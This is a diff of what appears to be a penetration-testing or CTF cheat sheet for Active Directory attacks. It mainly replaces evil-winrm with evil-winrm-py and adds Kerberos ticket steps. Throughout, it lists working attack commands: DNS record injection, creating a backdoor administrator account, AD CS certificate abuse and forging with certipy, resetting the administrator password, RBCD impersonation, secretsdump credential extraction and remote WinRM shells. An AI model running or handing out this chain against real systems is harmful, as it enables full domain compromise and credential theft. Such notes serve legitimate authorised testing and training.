@@ -236,8 +236,9 @@ sudo responder -I tun0 -v
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
-evil-winrm -i $TARGET -u $USERNAME -p $PASSWORD
-evil-winrm -i $DC -r $DOM
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
+evil-winrm-py -i $TARGET -u $USERNAME -p $PASSWORD
+evil-winrm-py -i $DC -r $DOM
 
 ## Set Administrator Account
 net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
@@ -677,7 +678,7 @@ https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD'; kcme
 
 +---------- .ccache to evil-winrm ----------+
-KRB5CCNAME='$USERNAME.ccache' evil-winrm -i $DC -r $DOM
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 
 +---------- ReadGMSAPassword ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
@@ -805,8 +806,9 @@ certipy shadow auto -k -target $DC -dc-ip $TARGET -account 'SVC_CABACKUP'
 adminSid=$(certipy account -k -target $DC -dc-ip $TARGET -user 'administrator' read 2>/dev/null | grep 'objectSid' | cut -d ':' -f2 | xargs -n1); certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -upn 'administrator' -sid "$adminSid" -key-size '4096'
 certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator.pfx'
 change_password administrator 123qweasdF!
-evil-winrm -i '$TARGET' -u 'administrator' -p '123qweasdF!'
-impacket-atexec -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'@$TARGET "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-getTGT $DOM/'administrator:123qweasdF!'; kcme
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
+evil-winrm-py -i $TARGET -u 'administrator' -p '123qweasdF!'
 
 +---------- ESC4 ----------+
 certipy template -k -target $DC -dc-ip $TARGET -template '' -write-default-configuration
@@ -848,12 +850,16 @@ certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
 certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
 certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator_forged.pfx'
 change_password administrator 123qweasdF!
+impacket-getTGT $DOM/'administrator:123qweasdF!'; kcme
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 evil-winrm -i '$TARGET' -u 'administrator' -p '123qweasdF!'
 
 +---------- Authenticate ----------+
 certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator.pfx'
 change_password administrator 123qweasdF!
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
+impacket-getTGT $DOM/'administrator' -hashes ':'; kcme
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 evil-winrm -i $TARGET -u administrator -H ''
 
 +---------- Crack ----------+
@@ -1098,6 +1104,8 @@ impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegat
 impacket-getTGT $DOM/'mypc$':'123qweasdF!'; kcme
 impacket-getST $DOM/mypc$ -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; kcme
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
+impacket-getTGT $DOM/'administrator' -hashes ':'; kcme
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 evil-winrm -i $TARGET -u administrator -H ''
 
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!'
